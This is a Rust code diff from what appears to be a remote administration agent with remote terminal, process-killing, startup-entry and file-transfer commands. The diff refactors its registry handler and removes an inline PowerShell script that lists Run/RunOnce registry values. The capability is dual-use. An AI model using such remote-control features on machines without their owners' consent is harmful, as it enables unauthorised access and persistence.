@@ -5,6 +5,7 @@ use std::fs;
 use std::path::{Path, PathBuf};
 
 mod file_manager;
+mod registry_manager;
 mod remote_terminal;
 
 pub(crate) use file_manager::handle_transfer as handle_file_transfer;
@@ -17,7 +18,7 @@ pub fn handle(command: &CommandKind, payload: &str) -> String {
         CommandKind::FileManager => file_manager::handle(payload),
         CommandKind::KillTargetProcess => kill_target_process(payload),
         CommandKind::ProcessManager => process_list(),
-        CommandKind::RegistryManager => registry_manager(),
+        CommandKind::RegistryManager => registry_manager::handle(payload),
         CommandKind::RemoteTerminal => remote_terminal::execute(payload),
         CommandKind::StartupManager => startup_manager(payload),
         CommandKind::WindowManager => window_manager(),
@@ -175,15 +176,6 @@ fn startup_action_error_table(message: &str) -> String {
         "Scope\tSource\tName\tCommand\tStatus\n{}",
         table_row(&["-", "-", "Startup action failed", message, "Error"])
     )
-}
-
-fn registry_manager() -> String {
-    let output = if cfg!(target_os = "windows") {
-        windows_registry_manager()
-    } else {
-        unsupported_registry_table()
-    };
-    join_sections("registry_manager", vec![output])
 }
 
 fn driver_manager() -> String {
@@ -601,60 +593,6 @@ fn linux_set_startup_item_enabled(source: &str, name: &str, enabled: bool) -> Re
         }
         _ => Err(format!("unsupported Linux startup source: {source}")),
     }
-}
-
-fn windows_registry_manager() -> String {
-    run_powershell(
-        r#"
-function Clean($value) {
-  if ($null -eq $value) { return "-" }
-  $text = [string]$value
-  $text = $text -replace "`r|`n|`t", " "
-  if ([string]::IsNullOrWhiteSpace($text)) { "-" } else { $text.Trim() }
-}
-Write-Output "Hive`tPath`tName`tType`tValue"
-$count = 0
-function EmitRow($hive, $path, $name, $type, $value) {
-  $script:count += 1
-  "{0}`t{1}`t{2}`t{3}`t{4}" -f (Clean $hive),(Clean $path),(Clean $name),(Clean $type),(Clean $value)
-}
-$keys = @(
-  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
-  "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
-  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
-  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
-  "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
-)
-foreach ($key in $keys) {
-  if (!(Test-Path $key)) { continue }
-  $item = Get-Item -Path $key
-  $props = Get-ItemProperty -Path $key
-  $hive = if ($key.StartsWith("HKCU:")) { "HKCU" } elseif ($key.StartsWith("HKLM:")) { "HKLM" } else { "-" }
-  $path = $key -replace "^[^:]+:\\", ""
-  $props.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | Select-Object -First 120 | ForEach-Object {
-    $kind = try { $item.GetValueKind($_.Name) } catch { "Unknown" }
-    EmitRow $hive $path $_.Name $kind $_.Value
-  }
-}
-if ($count -eq 0) {
-  EmitRow "-" "-" "No registry values found" "Info" "-"
-}
-"#,
-        300,
-    )
-}
-
-fn unsupported_registry_table() -> String {
-    format!(
-        "Hive\tPath\tName\tType\tValue\n{}",
-        table_row(&[
-            "-",
-            "-",
-            "Unsupported",
-            "Info",
-            "Registry Manager is only available on Windows",
-        ])
-    )
 }
 
 fn windows_driver_manager() -> String {
@@ -1124,7 +1062,6 @@ fn macos_lsof_connection_row(line: &str) -> Option<String> {
     }
     let (local, foreign) = endpoint
         .split_once("->")
-        .map(|(local, foreign)| (local, foreign))
         .unwrap_or((endpoint.as_str(), "*"));
 
     Some(format!(
@@ -1142,23 +1079,13 @@ fn macos_lsof_connection_row(line: &str) -> Option<String> {
 mod tests {
     use super::{
         macos_log_row, macos_lsof_connection_row, safe_startup_file_stem, set_desktop_entry_key,
-        table_row, unsupported_registry_table, StartupRequest,
+        table_row, StartupRequest,
     };
     use base64::{engine::general_purpose::STANDARD, Engine};
 
     #[test]
     fn table_row_sanitizes_embedded_line_breaks_and_tabs() {
         assert_eq!(table_row(&["a\tb", "c\rd", "e\nf"]), "a b\tc d\te f");
-    }
-
-    #[test]
-    fn unsupported_registry_response_stays_tabular() {
-        let table = unsupported_registry_table();
-        let rows = table.lines().collect::<Vec<_>>();
-
-        assert_eq!(rows.first(), Some(&"Hive\tPath\tName\tType\tValue"));
-        assert_eq!(rows.len(), 2);
-        assert!(rows[1].contains("Registry Manager is only available on Windows"));
     }
 
     #[test]
